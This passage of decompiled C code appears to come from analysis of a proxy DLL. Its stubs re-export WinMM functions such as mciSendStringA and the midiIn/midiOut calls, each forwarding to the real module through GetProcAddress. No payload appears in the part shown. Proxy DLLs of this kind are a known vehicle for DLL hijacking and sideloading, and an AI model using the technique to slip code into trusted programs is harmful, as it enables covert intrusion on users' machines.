                    /* 0x1b37  58  mciGetYieldProc */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciGetYieldProc");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001b7f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      pYVar1 = (YIELDPROC)
               (*UNRECOVERED_JUMPTABLE)(CONCAT44(in_register_0000000c,mciId),pdwYieldData);
      return pYVar1;
    }
  }
  return (YIELDPROC)0x0;
}



/* 0x180001b8e mciLoadCommandResource; Evidence ev_69a41ede3743b5fbfcc94c74112b6fe686e31cc202d497ea4f2aa977704c50c0 */

INT_PTR mciLoadCommandResource
                  (undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x1b8e  59  mciLoadCommandResource */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciLoadCommandResource");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001bd6. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180001be5 mciSendCommandA; Evidence ev_4de96558ff5e080418d0f4666cd6a904a0a09a12ec8aa34c9535440faae33fe5 */

MCIERROR __stdcall
mciSendCommandA(MCIDEVICEID mciId,UINT uMsg,DWORD_PTR dwParam1,DWORD_PTR dwParam2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000014;
  
                    /* 0x1be5  60  mciSendCommandA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciSendCommandA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001c2d. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mciId),CONCAT44(in_register_00000014,uMsg),
                         dwParam1,dwParam2);
      return (MCIERROR)IVar1;
    }
  }
  return 0;
}



/* 0x180001c3c mciSendCommandW; Evidence ev_9b5bf14e1757176847cf89b0dccf1925113e4c89d196da0bd43613eea3f4da1e */

MCIERROR __stdcall
mciSendCommandW(MCIDEVICEID mciId,UINT uMsg,DWORD_PTR dwParam1,DWORD_PTR dwParam2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000014;
  
                    /* 0x1c3c  61  mciSendCommandW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciSendCommandW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001c84. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mciId),CONCAT44(in_register_00000014,uMsg),
                         dwParam1,dwParam2);
      return (MCIERROR)IVar1;
    }
  }
  return 0;
}



/* 0x180001c93 mciSendStringA; Evidence ev_37f72c7436a5be541fb43a360e6d79bf56022e44a6012939148f2c34aa0b6480 */

MCIERROR __stdcall
mciSendStringA(LPCSTR lpstrCommand,LPSTR lpstrReturnString,UINT uReturnLength,HWND hwndCallback)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x1c93  62  mciSendStringA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciSendStringA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001cdb. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (lpstrCommand,lpstrReturnString,CONCAT44(in_register_00000084,uReturnLength)
                         ,hwndCallback);
      return (MCIERROR)IVar1;
    }
  }
  return 0;
}



/* 0x180001cea mciSendStringW; Evidence ev_78f6dc98aba1f2c07f61f1415a61963db3bee58e76d770f2b645858fd8600efa */

MCIERROR __stdcall
mciSendStringW(LPCWSTR lpstrCommand,LPWSTR lpstrReturnString,UINT uReturnLength,HWND hwndCallback)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x1cea  63  mciSendStringW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciSendStringW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001d32. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (lpstrCommand,lpstrReturnString,CONCAT44(in_register_00000084,uReturnLength)
                         ,hwndCallback);
      return (MCIERROR)IVar1;
    }
  }
  return 0;
}



/* 0x180001d41 mciSetDriverData; Evidence ev_219aa40a2f00e8888e3438e5eb9473b64e8371fbf63b9f070893c074e3e8c60a */

INT_PTR mciSetDriverData(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4
                        )

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x1d41  64  mciSetDriverData */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciSetDriverData");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001d89. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180001d98 mciSetYieldProc; Evidence ev_5a2600aa2eeb5e9abad478288f3375cf6d14d1bd14abc3a17990415e9ea74757 */

BOOL __stdcall mciSetYieldProc(MCIDEVICEID mciId,YIELDPROC fpYieldProc,DWORD dwYieldData)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x1d98  65  mciSetYieldProc */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciSetYieldProc");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001de0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mciId),fpYieldProc,
                         CONCAT44(in_register_00000084,dwYieldData));
      return (BOOL)IVar1;
    }
  }
  return 0;
}



/* 0x180001def midiConnect; Evidence ev_eafa11dd110aaf8cafa71d4bf73652b44dc34baa2673ccd0e4c2f5eea087c65b */

MMRESULT __stdcall midiConnect(HMIDI hmi,HMIDIOUT hmo,LPVOID pReserved)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x1def  66  midiConnect */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiConnect");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001e37. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmi,hmo,pReserved);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180001e46 midiDisconnect; Evidence ev_ae2a9fc9af0cbb6eb56b2aae514f2f9db9c9241b7f4f6cf72002272749e16786 */

MMRESULT __stdcall midiDisconnect(HMIDI hmi,HMIDIOUT hmo,LPVOID pReserved)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x1e46  67  midiDisconnect */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiDisconnect");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001e8e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmi,hmo,pReserved);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180001e9d midiInAddBuffer; Evidence ev_2d936d719d5f521c1203d0a51a4acdb3ba4c0b2e456b6e90e8934d940d1ad8f3 */

MMRESULT __stdcall midiInAddBuffer(HMIDIIN hmi,LPMIDIHDR pmh,UINT cbmh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x1e9d  68  midiInAddBuffer */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInAddBuffer");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001ee5. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmi,pmh,CONCAT44(in_register_00000084,cbmh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180001ef4 midiInClose; Evidence ev_4596529ece2668464046eab9beabed91b8bb5ea649adda71f8906ad2a20b5bbe */

MMRESULT __stdcall midiInClose(HMIDIIN hmi)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x1ef4  69  midiInClose */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInClose");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001f3c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmi);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180001f4b midiInGetDevCapsA; Evidence ev_7ff02f4b6a38d69f5a4aa80d8e6d21cee8232a8aded2430134c9d0149eb7f30a */

MMRESULT __stdcall midiInGetDevCapsA(UINT_PTR uDeviceID,LPMIDIINCAPSA pmic,UINT cbmic)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x1f4b  70  midiInGetDevCapsA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInGetDevCapsA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001f93. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uDeviceID,pmic,CONCAT44(in_register_00000084,cbmic));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180001fa2 midiInGetDevCapsW; Evidence ev_2787e5a6e3b72722a197af6b2ab0fb8f2e5708911c940c25eb6d617ee1e03c24 */

MMRESULT __stdcall midiInGetDevCapsW(UINT_PTR uDeviceID,LPMIDIINCAPSW pmic,UINT cbmic)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x1fa2  71  midiInGetDevCapsW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInGetDevCapsW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001fea. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uDeviceID,pmic,CONCAT44(in_register_00000084,cbmic));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180001ff9 midiInGetErrorTextA; Evidence ev_4188fa7ec183b6c8dcf516f7eb27e7a31911cf1e5aaf15a372b1307b7ec8ae51 */

MMRESULT __stdcall midiInGetErrorTextA(MMRESULT mmrError,LPSTR pszText,UINT cchText)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x1ff9  72  midiInGetErrorTextA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInGetErrorTextA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002041. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mmrError),pszText,
                         CONCAT44(in_register_00000084,cchText));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002050 midiInGetErrorTextW; Evidence ev_3c17d744962c7160d4a8e23e9c24c874594092f8b52fde28dfb1b2eca618be7e */

MMRESULT __stdcall midiInGetErrorTextW(MMRESULT mmrError,LPWSTR pszText,UINT cchText)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x2050  73  midiInGetErrorTextW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInGetErrorTextW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002098. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mmrError),pszText,
                         CONCAT44(in_register_00000084,cchText));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800020a7 midiInGetID; Evidence ev_10902760b74deb9e3cf8518892de6ffdbc2aeb90d710d2fbc3f9c6aca13d9aaa */

MMRESULT __stdcall midiInGetID(HMIDIIN hmi,LPUINT puDeviceID)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x20a7  74  midiInGetID */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInGetID");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800020ef. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmi,puDeviceID);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800020fe midiInGetNumDevs; Evidence ev_c5c49f3f0fd5292e9c22253ac6e2be508cb9dc655055b4aae63a8be9e245c930 */

UINT __stdcall midiInGetNumDevs(void)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x20fe  75  midiInGetNumDevs */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInGetNumDevs");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002146. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)();
      return (UINT)IVar1;
    }
  }
  return 0;
}



/* 0x180002155 midiInMessage; Evidence ev_4b93654863ab2b74766819fe5fa684b4e6a2fc58f2a1c392e191ea6c6cf328fa */

MMRESULT __stdcall midiInMessage(HMIDIIN hmi,UINT uMsg,DWORD_PTR dw1,DWORD_PTR dw2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x2155  76  midiInMessage */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInMessage");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000219d. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmi,CONCAT44(in_register_00000014,uMsg),dw1,dw2);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800021ac midiInOpen; Evidence ev_11dc5c8a1952aaf6c2eb5b5259fa61db952b65d5e20e9b16464429e377235e20 */

MMRESULT __stdcall
midiInOpen(LPHMIDIIN phmi,UINT uDeviceID,DWORD_PTR dwCallback,DWORD_PTR dwInstance,DWORD fdwOpen)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x21ac  77  midiInOpen */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInOpen");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800021f4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (phmi,CONCAT44(in_register_00000014,uDeviceID),dwCallback,dwInstance);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002203 midiInPrepareHeader; Evidence ev_b19728ee159c978320e4b94d883aeecbecf7913d29323ea8e932b4d6857051a8 */

MMRESULT __stdcall midiInPrepareHeader(HMIDIIN hmi,LPMIDIHDR pmh,UINT cbmh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2203  78  midiInPrepareHeader */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInPrepareHeader");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000224b. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmi,pmh,CONCAT44(in_register_00000084,cbmh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000225a midiInReset; Evidence ev_e8041b9bbe2cd9cdececd02c696493218a92ba5323d21b0221db4f7fe23ac4fd */

MMRESULT __stdcall midiInReset(HMIDIIN hmi)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x225a  79  midiInReset */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInReset");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800022a2. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmi);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800022b1 midiInStart; Evidence ev_245195e8fd81907a58715812edba65b8c355fdd399c923c0badb95756e4a41e2 */

MMRESULT __stdcall midiInStart(HMIDIIN hmi)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x22b1  80  midiInStart */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInStart");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800022f9. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmi);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002308 midiInStop; Evidence ev_cf283cef33b22ec4adb039167cb1b1fd3def4a635f4510f243285bec8fca755c */

MMRESULT __stdcall midiInStop(HMIDIIN hmi)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x2308  81  midiInStop */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInStop");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002350. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmi);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000235f midiInUnprepareHeader; Evidence ev_43543e553610eba8e2b21190c192627f88e262524595f1ec6ef68dc0305af56d */

MMRESULT __stdcall midiInUnprepareHeader(HMIDIIN hmi,LPMIDIHDR pmh,UINT cbmh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x235f  82  midiInUnprepareHeader */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiInUnprepareHeader");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800023a7. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmi,pmh,CONCAT44(in_register_00000084,cbmh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800023b6 midiOutCacheDrumPatches; Evidence ev_34423c1c19cba444b73721bce8c768737e60c3991f1576e987a36f65b2ec4b60 */

MMRESULT __stdcall midiOutCacheDrumPatches(HMIDIOUT hmo,UINT uPatch,LPWORD pwkya,UINT fuCache)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  undefined4 in_register_0000008c;
  
                    /* 0x23b6  83  midiOutCacheDrumPatches */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutCacheDrumPatches");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800023fe. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (hmo,CONCAT44(in_register_00000014,uPatch),pwkya,
                         CONCAT44(in_register_0000008c,fuCache));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000240d midiOutCachePatches; Evidence ev_a83195ded9b1b3927be5a57642c4646c48f7a6469be4456b5db08b756fba1b63 */

MMRESULT __stdcall midiOutCachePatches(HMIDIOUT hmo,UINT uBank,LPWORD pwpa,UINT fuCache)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  undefined4 in_register_0000008c;
  
                    /* 0x240d  84  midiOutCachePatches */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutCachePatches");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002455. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (hmo,CONCAT44(in_register_00000014,uBank),pwpa,
                         CONCAT44(in_register_0000008c,fuCache));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002464 midiOutClose; Evidence ev_48794252e180c75c8d4407d1a0cc0b4937d4b0b9942fded0368a59837365390e */

MMRESULT __stdcall midiOutClose(HMIDIOUT hmo)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x2464  85  midiOutClose */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutClose");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800024ac. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmo);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800024bb midiOutGetDevCapsA; Evidence ev_080f372ec886ab56c146e210c7f1fea8ff6a6b69b099bb31489dba06fb335fa7 */

MMRESULT __stdcall midiOutGetDevCapsA(UINT_PTR uDeviceID,LPMIDIOUTCAPSA pmoc,UINT cbmoc)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x24bb  86  midiOutGetDevCapsA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutGetDevCapsA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002503. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uDeviceID,pmoc,CONCAT44(in_register_00000084,cbmoc));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002512 midiOutGetDevCapsW; Evidence ev_85b84d0fb6801d03f312417c5147593b3bc56ca95fc02f639b6bd8fec9c563b3 */

MMRESULT __stdcall midiOutGetDevCapsW(UINT_PTR uDeviceID,LPMIDIOUTCAPSW pmoc,UINT cbmoc)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2512  87  midiOutGetDevCapsW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutGetDevCapsW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000255a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uDeviceID,pmoc,CONCAT44(in_register_00000084,cbmoc));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002569 midiOutGetErrorTextA; Evidence ev_ceed456343ab2e1fabbb276a9913e532f506a326f03422811e0053f71949a82a */

MMRESULT __stdcall midiOutGetErrorTextA(MMRESULT mmrError,LPSTR pszText,UINT cchText)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x2569  88  midiOutGetErrorTextA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutGetErrorTextA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800025b1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mmrError),pszText,
                         CONCAT44(in_register_00000084,cchText));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800025c0 midiOutGetErrorTextW; Evidence ev_39206cb5c6974f179de1d5a62aeeb5f8812173d405b795dc7060764a9fbf2d0d */

MMRESULT __stdcall midiOutGetErrorTextW(MMRESULT mmrError,LPWSTR pszText,UINT cchText)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x25c0  89  midiOutGetErrorTextW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutGetErrorTextW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002608. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mmrError),pszText,
                         CONCAT44(in_register_00000084,cchText));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002617 midiOutGetID; Evidence ev_06f620ab463852426ac3e51522fb22f84d91ca5ccbcf5f9c7914123878391f71 */

MMRESULT __stdcall midiOutGetID(HMIDIOUT hmo,LPUINT puDeviceID)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x2617  90  midiOutGetID */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutGetID");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000265f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmo,puDeviceID);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000266e midiOutGetNumDevs; Evidence ev_3312e75bb19122eade34a1e6abad8fd1d38c8cc637819092556233e4e5129482 */

UINT __stdcall midiOutGetNumDevs(void)

{
